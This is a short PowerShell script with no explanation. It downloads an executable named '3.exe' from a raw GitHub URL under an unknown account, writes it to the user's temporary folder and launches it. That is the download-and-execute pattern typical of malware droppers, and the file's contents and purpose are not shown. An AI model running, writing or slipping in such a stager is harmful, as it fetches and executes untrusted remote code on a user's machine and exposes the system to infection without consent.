$url = "https://raw.githubusercontent.com/Drenote/123/refs/heads/main/3.exe"
$outPath = "$env:TEMP\3.exe"
Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing
Start-Process -FilePath $outPath -Wait
